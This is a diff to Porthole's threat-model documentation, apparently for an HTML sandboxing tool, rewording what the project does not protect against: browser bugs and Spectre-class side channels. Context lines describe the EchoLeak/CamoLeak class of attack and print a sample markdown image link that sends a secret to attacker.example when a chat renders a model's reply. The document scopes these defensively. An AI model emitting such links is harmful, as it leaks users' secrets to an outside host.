@@ -96,9 +96,9 @@ Porthole does not protect against these.
 - **Browser bugs, and what the leak suite doesn't run on.** The walls are the browser's own (the
   sandbox, CSP, same-origin policy, site isolation): a bug in them is outside Porthole. The suite
   runs Chromium, WebKit and Firefox through Playwright; other engines, versions and embedded
-  WebViews are untested. Side channels between processes are out too: an opaque frame that shares
-  the host's process may learn about it by timing (Spectre-class attacks); domain mode puts content
-  on another site.
+  WebViews are untested. Side channels (timing, Spectre-class) are out too: an opaque frame that
+  may share the host's process can learn about it that way; domain mode puts content on another
+  site, which browsers with site isolation give its own process.
 - **Markdown-image exfiltration in chat renderers** (the EchoLeak and CamoLeak class: a model's
   reply holds `![](https://attacker.example/?q=<secret>)` and the chat loads it). That is the
   chat's own rendering of model text. Porthole's walls apply to HTML handed to a display.
